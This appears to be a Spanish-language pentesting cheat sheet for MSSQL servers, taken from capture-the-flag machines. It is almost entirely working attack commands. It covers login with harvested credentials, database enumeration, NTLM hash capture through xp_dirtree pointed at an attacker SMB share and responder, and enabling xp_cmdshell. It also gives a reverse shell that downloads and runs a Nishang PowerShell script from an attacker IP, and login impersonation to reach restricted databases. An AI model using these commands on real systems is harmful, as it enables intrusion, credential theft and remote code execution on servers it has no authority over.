
### CONECTARSE
```shell
#CON mssqlclient.py
❯ mssqlclient.py reporting@10.10.10.125 -windows-auth

#CON IMPACKET
❯ impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
```

### ENUMERAR
```SQL
SELECT name FROM master.dbo.sysdatabases; #BASES DE DATOS

USE orcharddb; #CAMBIAR A UNA BASE DE DATOS

SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES; #ENUMERAR LAS TABLAS.

SELECT * FROM blog_Orchard_Users_UserPartRecord; #ENUMERAR CONTENIDO DE TABLAS.
```
### OBTENER HASH
```shell
#MÁQUINA VICTIMA
SQL (QUERIER\reporting  reporting@volume)> select IS_SRVROLEMEMBER ('sysadmin')
SQL (QUERIER\reporting  reporting@volume)> exec xp_dirtree '\\10.10.16.7\smbFolder\file'

#MÁQUINA LOCAL
❯ sudo smbserver.py smbFolder $(pwd) -smb2support
```

### EJECUTAR COMANDOS
```sql
SQL (QUERIER\mssql-svc  dbo@master)> sp_configure "xp_cmdshell", 1
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "COMMAND"
```

### ACTIVAR xp_cmdshell
```SQL
SQL (QUERIER\mssql-svc  dbo@master)> sp_configure "show advanced options", 1
SQL (QUERIER\mssql-svc  dbo@master)> RECONFIGURE
SQL (QUERIER\mssql-svc  dbo@master)> sp_configure "xp_cmdshell", 1
SQL (QUERIER\mssql-svc  dbo@master)> RECONFIGURE
```

### REVERSE SHELL
```shell
#INSTALAR REPOSITORIO NISHANG EN MÁQUINA LOCAL
❯ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1


#AÑADIMOS ESTA LINEA AL FINAL DEL ARCHIVO
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.189 -Port 4444

❯ mv Invoke-PowerShellTcp.ps1 PS.ps1

#SERVIDOR DE PYTHON
❯ sudo python3 -m http.server 80

#LISTENER
❯ nc -nlvp 4444

#EJECUTAR LA REVERSE SHELL
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://192.168.45.189/PS.ps1\")"
```

### HASH
```shell
❯ sudo responder -I tun0 -v
SQL (QUERIER\mssql-svc  dbo@master)> EXEC MASTER.sys.xp_dirtree '\\10.10.16.7\test', 1, 1
```

### ARCHIVOS DEL SISTEMA
```shell
xp_dirtree #ENUMERAR TODOS


xp_dirtree \inetpub\wwwroot #ACCEDER A UNO
```

### VER LOGS
```shell
type C:\sqlserver\Logs\ERRORLOG.bak
```


### ERROR AL ACCEDER A UNA BASE DE DATOS
```shell
#ERROR(DC\SQLEXPRESS): Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.

SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
EXECUTE AS LOGIN = 'hrappdb-reader'

#AHORA YA POODRIAMOS ACCEDER A LA BASE DE DATOS
```
